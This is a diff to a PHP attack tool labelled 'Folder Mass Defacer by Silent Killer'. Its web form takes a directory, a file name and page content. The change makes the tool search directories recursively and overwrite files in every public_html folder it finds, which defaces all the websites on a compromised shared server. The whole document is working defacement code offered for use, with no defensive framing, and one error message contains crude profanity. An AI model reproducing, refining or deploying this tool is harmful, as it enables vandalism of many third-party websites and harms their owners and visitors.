@@ -4,7 +4,7 @@ echo "<title>Folder Mass Defacer by Silent Killer</title>";
 
 echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
 
-echo "<body bgcolor='gray'><font color=black'><font face='Electrolize'>";
+echo "<body bgcolor='gray'><font color='black'><font face='Electrolize'>";
 
 echo "<center><form method='POST'>";
 
@@ -20,38 +20,40 @@ echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' s
 
 echo "<input type='submit' value='Mass !!!'></form></center>";
 
-if (isset ($_POST['base_dir']))
-
-{
-
-if (!file_exists ($_POST['base_dir']))
-
-die ($_POST['base_dir']." Not Found !<br>");
-
-if (!is_dir ($_POST['base_dir']))
-
-die ($_POST['base_dir']." Is Not A Directory !<br>");
-
-@chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
-
-$files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
-
-foreach ($files as $file):
-
-if ($file != "." && $file != ".." && @filetype ($file) == "dir")
-
-{
-
-$index = getcwd ()."/".$file."/".$_POST['andela'];
-
-if (file_put_contents ($index, $_POST['index']))
-
-echo "<hr color='black'>>> <font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
-
+function deface($dir, $file_name, $content) {
+    $files = scandir($dir);
+    foreach ($files as $file) {
+        if ($file != "." && $file != "..") {
+            $path = $dir . '/' . $file;
+            if (is_dir($path)) {
+                // Check if it is the public_html directory
+                if (basename($path) == 'public_html') {
+                    $index = $path . '/' . $file_name;
+                    if (file_put_contents($index, $content)) {
+                        echo "<hr color='black'>>> <font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(✔)</font>";
+                    }
+                } else {
+                    // Recursively go deeper into directories
+                    deface($path, $file_name, $content);
+                }
+            }
+        }
+    }
 }
 
-endforeach;
+if (isset($_POST['base_dir'])) {
 
+    if (!file_exists($_POST['base_dir'])) {
+        die($_POST['base_dir'] . " Not Found !<br>");
+    }
+
+    if (!is_dir($_POST['base_dir'])) {
+        die($_POST['base_dir'] . " Is Not A Directory !<br>");
+    }
+
+    @chdir($_POST['base_dir']) or die("Cannot Open Directory");
+
+    deface(getcwd(), $_POST['andela'], $_POST['index']);
 }
 
 ?>
